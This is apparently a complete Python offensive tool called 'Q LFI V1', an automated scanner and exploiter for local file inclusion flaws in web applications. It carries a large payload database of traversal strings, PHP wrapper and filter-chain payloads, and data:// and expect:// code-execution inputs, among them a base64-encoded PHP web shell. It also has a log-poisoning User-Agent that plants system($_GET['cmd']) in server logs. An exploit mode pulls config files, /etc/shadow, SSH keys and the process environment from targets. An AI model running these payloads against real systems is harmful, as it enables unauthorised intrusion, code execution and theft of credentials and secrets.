#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════════════════╗
║   ██████╗       ██╗     ███████╗██╗     ███████╗                             ║
║   ██╔══██╗      ██║     ██╔════╝██║     ██╔════╝                             ║
║   ██║  ██║█████╗██║     █████╗  ██║     ███████╗                             ║
║   ██║▄▄██║╚════╝██║     ██╔══╝  ██║     ╚════██║                             ║
║   ╚██████╔╝     ███████╗██║     ███████╗███████║                             ║
║    ╚══▀▀═╝      ╚══════╝╚═╝     ╚══════╝╚══════╝                             ║
║                                                                              ║
║              Q LFI V1 - Ultimate Auto-Exploit LFI Scanner                    ║
║                     Developed by Arsenik                                     ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import argparse
import requests
import sys
import time
import os
import re
import json
import random
import base64
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, quote, unquote, parse_qs, urlencode
from datetime import datetime
from colorama import init, Fore, Style, Back
import warnings

# SSL uyarılarını gizle
warnings.filterwarnings('ignore', message='Unverified HTTPS request')
init(autoreset=True)

# ============================================================================
# GLOBAL CONFIG
# ============================================================================

VERSION = "V1"
AUTHOR = "Arsenik"
SCRIPT_NAME = "Q LFI"

# ============================================================================
# BANNER
# ============================================================================

BANNER = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║   ██████╗       ██╗     ███████╗██╗     ███████╗                             ║
║   ██╔══██╗      ██║     ██╔════╝██║     ██╔════╝                             ║
║   ██║  ██║█████╗██║     █████╗  ██║     ███████╗                             ║
║   ██║▄▄██║╚════╝██║     ██╔══╝  ██║     ╚════██║                             ║
║   ╚██████╔╝     ███████╗██║     ███████╗███████║                             ║
║    ╚══▀▀═╝      ╚══════╝╚═╝     ╚══════╝╚══════╝                             ║
║                                                                              ║
║        {Fore.YELLOW}Q LFI {VERSION} - Ultimate Auto-Exploit LFI Scanner{Fore.CYAN}                      ║
║              {Fore.MAGENTA}Developed by {AUTHOR}{Fore.CYAN}                                              ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

# ============================================================================
# USER AGENTS DATABASE
# ============================================================================

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'curl/8.4.0',
    'python-requests/2.31.0',
    'Q-LFI-Scanner/V1 (Security Research)',
]

# ============================================================================
# ELITE PAYLOAD DATABASE
# ============================================================================

PAYLOADS = {
    "basic_traversal": [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//....//etc/passwd",
        "../../../../../../../../../../../etc/passwd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252f..%252fetc%252fpasswd",
        "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "../../../../etc/passwd%00",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd%00",
    ],
    
    "php_wrappers": [
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=string.rot13/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
        "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
        "php://filter/read=string.toupper/resource=index.php",
        "PHP://FILTER/CONVERT.BASE64-ENCODE/RESOURCE=index.php",
    ],
    
    "php_filter_chains": [
        "php://filter/convert.base64-encode|convert.base64-encode/resource=index.php",
        "php://filter/convert.iconv.UTF-8.UTF-16LE|convert.base64-encode/resource=index.php",
        "php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode/resource=index.php",
        "php://filter/zlib.deflate|convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-decode|convert.base64-encode/resource=index.php",
        "php://filter/string.strip_tags|convert.base64-encode/resource=index.php",
    ],
    
    "php_input_data": [
        "php://input",
        "data://text/plain,<?php system($_GET['cmd']);?>",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "expect://id",
        "expect://whoami",
        "expect://cat /etc/passwd",
    ],
    
    "proc_files": [
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "/proc/self/fd/3",
        "/proc/self/status",
        "/proc/version",
        "/proc/mounts",
    ],
    
    "log_poisoning": [
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/apache/access.log",
        "/var/log/httpd/access.log",
        "/var/log/nginx/access.log",
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/messages",
        "/usr/local/apache/logs/access.log",
        "C:/xampp/apache/logs/access.log",
        "C:/wamp/logs/access.log",
    ],
    
    "linux_sensitive": [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/resolv.conf",
        "/etc/ssh/sshd_config",
        "/root/.ssh/id_rsa",
        "/root/.ssh/authorized_keys",
        "/var/www/html/config.php",
        "/var/www/.env",
        "/app/.env",
        "/app/config/database.php",
    ],
    
    "windows_sensitive": [
        "C:/Windows/System32/drivers/etc/hosts",
        "C:/Windows/win.ini",
        "C:/Windows/system.ini",
        "C:/inetpub/wwwroot/web.config",
        "C:/xampp/htdocs/config.php",
        "file:///C:/Windows/win.ini",
    ],
    
    "wrapper_bypass": [
        "phar:///etc/passwd",
        "file:///etc/passwd",
        "file://localhost/etc/passwd",
        "glob://*.php",
    ],
}

# ============================================================================
# DETECTION PATTERNS
# ============================================================================

DETECTION_PATTERNS = {
    "linux_passwd": [r"root:[x*]:0:0:", r"daemon:[x*]:", r"/bin/bash", r"/bin/sh"],
    "windows_ini": [r"\[fonts\]", r"\[extensions\]", r"for 16-bit app support"],
    "php_code": [r"<\?php", r"PD9waHA", r"Warning.*include", r"Failed opening"],
    "error_msgs": [r"failed to open stream", r"No such file or directory"],
    "proc_files": [r"Name:\s*\w+", r"Uid:\s*\d+"],
    "log_files": [r"GET /.* HTTP", r"POST /.* HTTP", r"\d+\.\d+\.\d+\.\d+"],
    "base64": [r"^[A-Za-z0-9+/]{50,}={0,2}$"],
}

# ============================================================================
# COMMON PARAMETERS
# ============================================================================

COMMON_PARAMS = [
    "file", "page", "include", "path", "dir", "document", "view",
    "content", "template", "php_path", "pg", "p", "f", "url", "uri",
    "load", "src", "source", "data", "config", "inc", "folder",
    "download", "filename", "file_path", "lang", "language",
]

# ============================================================================
# Q LFI SCANNER CLASS
# ============================================================================

class QLFIScanner:
    def __init__(self, threads=10, timeout=10, delay=0, verbose=False):
        self.threads = threads
        self.timeout = timeout
        self.delay = delay / 1000.0
        self.verbose = verbose
        
        self.session = requests.Session()
        self.session.verify = False
        
        self.results = []
        self.vulns = []
        self.lock = threading.Lock()
        
        # Tüm payloadları düz listeye çevir
        self.all_payloads = []
        for cat, payloads in PAYLOADS.items():
            for p in payloads:
                self.all_payloads.append({"payload": p, "category": cat})
        
        self.print_banner()
    
    def print_banner(self):
        print(BANNER)
        print(f"{Fore.CYAN}{'='*78}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  Version: {VERSION} | Developer: {AUTHOR} | Payloads: {len(self.all_payloads)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*78}{Style.RESET_ALL}\n")
    
    def log(self, msg, level="info"):
        ts = datetime.now().strftime("%H:%M:%S")
        if level == "success":
            print(f"{Fore.GREEN}[{ts}] [✓] {msg}{Style.RESET_ALL}")
        elif level == "vuln":
            print(f"{Fore.RED}{Back.WHITE}[{ts}] [VULN] {msg}{Style.RESET_ALL}")
        elif level == "exploit":
            print(f"{Fore.MAGENTA}[{ts}] [EXPLOIT] {msg}{Style.RESET_ALL}")
        elif level == "error":
            print(f"{Fore.RED}[{ts}] [✗] {msg}{Style.RESET_ALL}")
        elif level == "warning":
            print(f"{Fore.YELLOW}[{ts}] [!] {msg}{Style.RESET_ALL}")
        else:
            print(f"{Fore.CYAN}[{ts}] [*] {msg}{Style.RESET_ALL}")
    
    def get_random_ua(self):
        return random.choice(USER_AGENTS)
    
    def detect(self, text, payload, category):
        detections = []
        
        # Kategoriye göre pattern seç
        patterns = []
        if category in ["basic_traversal", "linux_sensitive"]:
            patterns = DETECTION_PATTERNS["linux_passwd"]
        elif category in ["windows_sensitive"]:
            patterns = DETECTION_PATTERNS["windows_ini"]
        elif category in ["php_wrappers", "php_filter_chains"]:
            patterns = DETECTION_PATTERNS["php_code"] + DETECTION_PATTERNS["base64"]
        elif category in ["proc_files"]:
            patterns = DETECTION_PATTERNS["proc_files"]
        elif category in ["log_poisoning"]:
            patterns = DETECTION_PATTERNS["log_files"]
        else:
            for p in DETECTION_PATTERNS.values():
                patterns.extend(p)
        
        for pat in patterns:
            if re.search(pat, text, re.IGNORECASE | re.MULTILINE):
                detections.append({"pattern": pat})
                break
        
        # Base64 decode kontrolü
        if category in ["php_wrappers", "php_filter_chains"]:
            try:
                for line in text.split('\n'):
                    if len(line) > 50 and re.match(r'^[A-Za-z0-9+/]+=*$', line.strip()):
                        try:
                            decoded = base64.b64decode(line.strip()).decode('utf-8', errors='ignore')
                            if '<?php' in decoded or 'root:' in decoded:
                                detections.append({"pattern": "base64_decoded", "decoded": decoded[:100]})
                                break
                        except:
                            pass
            except:
                pass
        
        return detections
    
    def test_payload(self, url, param, payload_info):
        payload = payload_info["payload"]
        category = payload_info["category"]
        
        try:
            # URL oluştur
            if param:
                if '=' in url:
                    test_url = re.sub(f'{param}=[^&]*', f'{param}={quote(payload)}', url)
                else:
                    test_url = f"{url}{param}={quote(payload)}"
            else:
                test_url = f"{url}{quote(payload)}"
            
            headers = {
                'User-Agent': self.get_random_ua(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            }
            
            # Log poisoning için özel header
            if category == "log_poisoning":
                headers['User-Agent'] = '<?php system($_GET["cmd"]); ?>'
            
            response = self.session.get(
                test_url,
                headers=headers,
                timeout=self.timeout,
                allow_redirects=True,
                verify=False
            )
            
            detections = self.detect(response.text, payload, category)
            
            if detections:
                result = {
                    "url": test_url,
                    "base_url": url,
                    "param": param,
                    "payload": payload,
                    "category": category,
                    "status_code": response.status_code,
                    "response_length": len(response.text),
                    "detections": detections,
                    "timestamp": datetime.now().isoformat()
                }
                
                with self.lock:
                    self.results.append(result)
                    if url not in [v["url"] for v in self.vulns]:
                        self.vulns.append({"url": url, "param": param})
                
                return result
            
            if self.delay > 0:
                time.sleep(self.delay)
            
            return None
            
        except Exception as e:
            if self.verbose:
                self.log(f"Error: {str(e)}", "error")
            return None
    
    def extract_params(self, url):
        params = []
        if '?' in url:
            query = url.split('?', 1)[1]
            for part in query.split('&'):
                if '=' in part:
                    params.append(part.split('=')[0])
                else:
                    params.append(part)
        return params if params else [None]
    
    def scan_url(self, url):
        url = url.strip()
        if not url or url.startswith('#'):
            return []
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        self.log(f"Scanning: {url}", "info")
        
        params = self.extract_params(url)
        results = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for param in params:
                for payload_info in self.all_payloads:
                    futures.append(executor.submit(self.test_payload, url, param, payload_info))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    self.log(f"VULNERABLE: {result['url'][:60]}...", "vuln")
                    self.log(f"  → Category: {result['category']} | Payload: {result['payload'][:40]}...", "success")
        
        return results
    
    def fuzz_params(self, base_url):
        self.log(f"Fuzzing parameters for: {base_url}", "info")
        results = []
        
        for param in COMMON_PARAMS:
            test_url = f"{base_url}?{param}=../../../../etc/passwd"
            result = self.test_payload(test_url, param, {
                "payload": "../../../../etc/passwd",
                "category": "basic_traversal"
            })
            if result:
                results.append(result)
                self.log(f"Found vulnerable param: {param}", "success")
        
        return results
    
    def auto_exploit(self, vuln):
        """Otomatik exploit denemesi"""
        url = vuln["url"]
        param = vuln["param"]
        
        self.log(f"Auto-exploiting: {url}", "exploit")
        
        exploit_payloads = [
            "../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=config.php",
            "/proc/self/environ",
        ]
        
        for payload in exploit_payloads:
            try:
                test_url = re.sub(f'{param}=[^&]*', f'{param}={quote(payload)}', url)
                headers = {'User-Agent': self.get_random_ua()}
                
                response = self.session.get(test_url, headers=headers, timeout=self.timeout, verify=False)
                
                self.log(f"Exploit payload: {payload}", "exploit")
                self.log(f"Status: {response.status_code} | Length: {len(response.text)}", "exploit")
                
                # İlk 300 karakteri göster
                preview = response.text[:300].replace('\n', ' ')
                print(f"{Fore.YELLOW}  Response: {preview}...{Style.RESET_ALL}")
                
            except Exception as e:
                self.log(f"Exploit failed: {str(e)}", "error")
    
    def generate_targets(self, output="targets.txt"):
        targets = [
            "http://localhost/index.php?page=",
            "http://localhost/test.php?file=",
            "http://127.0.0.1/vuln.php?include=",
            "http://127.0.0.1:8080/lfi.php?path=",
            "http://localhost/dvwa/vulnerabilities/fi/?page=",
        ]
        
        with open(output, 'w') as f:
            for t in targets:
                f.write(t + '\n')
        
        self.log(f"Targets generated: {output}", "success")
        return output
    
    def save_results(self, output):
        # JSON
        json_file = output.replace('.txt', '.json') if output.endswith('.txt') else output + '.json'
        with open(json_file, 'w') as f:
            json.dump({
                "scanner": SCRIPT_NAME,
                "version": VERSION,
                "developer": AUTHOR,
                "results": self.results,
                "vulnerable_urls": self.vulns
            }, f, indent=2)
        
        # TXT
        txt_file = output if output.endswith('.txt') else output + '.txt'
        with open(txt_file, 'w') as f:
            f.write(f"Q LFI {VERSION} Scan Results - Developed by {AUTHOR}\n")
            f.write(f"{'='*70}\n\n")
            for r in self.results:
                f.write(f"[VULN] {r['url']}\n")
                f.write(f"  Param: {r['param']} | Category: {r['category']}\n")
                f.write(f"  Payload: {r['payload']}\n\n")
        
        self.log(f"Results saved: {txt_file}, {json_file}", "success")
    
    def scan_file(self, input_file):
        if not os.path.exists(input_file):
            self.log(f"File not found: {input_file}", "error")
            return []
        
        with open(input_file, 'r') as f:
            urls = [l.strip() for l in f if l.strip() and not l.startswith('#')]
        
        self.log(f"Loaded {len(urls)} URLs", "success")
        
        all_results = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.scan_url, url): url for url in urls}
            for future in as_completed(futures):
                all_results.extend(future.result())
        
        return all_results


# ============================================================================
# MAIN
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description=f'{SCRIPT_NAME} {VERSION} - Auto-Exploit LFI Scanner | Developed by {AUTHOR}',
        epilog=f"""
Examples:
  python q_lfi.py -u http://localhost/test.php?page=
  python q_lfi.py -u http://localhost/test.php -f
  python q_lfi.py -i targets.txt
  python q_lfi.py --auto-gen
  python q_lfi.py -u http://target.com/page.php?id= --exploit
        """
    )
    
    parser.add_argument('-u', '--url', help='Single URL to scan')
    parser.add_argument('-i', '--input', help='Input file with URLs')
    parser.add_argument('-f', '--fuzz', action='store_true', help='Fuzz common parameters')
    parser.add_argument('--exploit', action='store_true', help='Auto-exploit vulnerabilities')
    parser.add_argument('--auto-gen', action='store_true', help='Generate targets.txt')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Threads (default: 10)')
    parser.add_argument('-d', '--delay', type=int, default=0, help='Delay in ms')
    parser.add_argument('-o', '--output', default='q_lfi_results.txt', help='Output file')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode')
    
    args = parser.parse_args()
    
    scanner = QLFIScanner(
        threads=args.threads,
        delay=args.delay,
        verbose=args.verbose
    )
    
    try:
        if args.auto_gen:
            scanner.generate_targets()
            return
        
        if args.url:
            if args.fuzz:
                base = args.url.split('?')[0]
                results = scanner.fuzz_params(base)
            else:
                results = scanner.scan_url(args.url)
            
            if results and args.exploit:
                for vuln in scanner.vulns:
                    scanner.auto_exploit(vuln)
            
            if results:
                scanner.save_results(args.output)
            return
        
        if args.input:
            results = scanner.scan_file(args.input)
            
            if results and args.exploit:
                for vuln in scanner.vulns:
                    scanner.auto_exploit(vuln)
            
            scanner.save_results(args.output)
            return
        
        parser.print_help()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        scanner.log(f"Fatal error: {str(e)}", "error")
        sys.exit(1)


if __name__ == '__main__':
    main()
